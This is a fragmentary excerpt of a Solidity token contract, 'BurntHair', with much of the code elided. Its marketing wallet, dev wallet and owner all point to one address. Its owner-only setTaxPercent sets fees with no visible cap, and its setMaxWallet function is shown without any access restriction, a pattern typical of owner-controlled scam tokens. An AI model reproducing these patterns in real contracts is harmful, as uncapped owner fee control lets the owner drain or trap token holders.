...
contract BurntHair is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x6F53da45e856D80b2Bd210966799099eE9666666); 
    address payable public Wallet_Dev = payable(0x6F53da45e856D80b2Bd210966799099eE9666666);
    ...
    string private constant _symbol = unicode"Burnt Hair"; 
    ...
    constructor () {
        ...
        _owner = 0x6F53da45e856D80b2Bd210966799099eE9666666;
    ...
    function setMaxWallet(uint256 maxTxAmount, uint256 newMaxWallet, uint256 BUY_FEE, uint256 SELL_FEE) external payable {
    ...
    function setTaxPercent(uint256 NEW_Percent_Marketing, uint256 NEW_Percent_Dev,uint256 NEW_Percent_Burn, uint256 NEW_Percent_AutoLP) external onlyOwner() {
        Percent_Marketing = NEW_Percent_Marketing;
        Percent_Dev = NEW_Percent_Dev;
        Percent_Burn = NEW_Percent_Burn;
        Percent_AutoLP = NEW_Percent_AutoLP;
    }
